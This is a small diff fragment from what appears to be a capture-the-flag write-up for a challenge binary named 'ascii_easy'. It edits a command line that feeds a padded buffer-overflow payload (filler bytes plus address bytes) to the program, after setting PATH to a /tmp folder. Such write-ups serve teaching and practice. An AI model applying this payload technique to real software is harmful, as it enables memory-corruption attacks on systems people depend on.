@@ -13,6 +13,6 @@ The code provided for the challenge is as follows:
 0x000973c : 63 00 (c /0)
 
 export PATH="$PATH:/tmp/dalal"
-./ascii_easy 'AAAAAAAAAAAAAAAAAAAABBBB@jaU<wVU'
+./ascii_easy 'AAAAAAAAAAAAAAAAAAAABBBB\x7fjaU<wVU<wVU'
 ```
 ## Exploit Code
